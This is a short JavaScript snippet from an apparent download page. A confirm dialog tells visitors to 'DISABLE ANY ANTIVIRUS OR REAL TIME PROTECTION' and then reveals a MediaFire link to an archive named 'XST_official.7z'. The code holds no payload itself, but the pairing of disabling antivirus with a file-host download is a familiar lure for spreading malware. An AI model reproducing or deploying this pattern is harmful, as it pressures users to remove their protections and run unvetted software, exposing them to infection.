  function showDownloadLink() {
            var confirmDownload = confirm("DISABLE ANY ANTIVIRUS OR REAL TIME PROTECTION");
            
            if (confirmDownload) {
                document.getElementById('downloadLink').style.display = 'block';
                document.getElementById('downloadLink').innerHTML = 'Download tool now <a href="https://www.mediafire.com/file/51p2r6sbglowmjl/XST_official.7z/file/file">here</a>.';
            }
        }
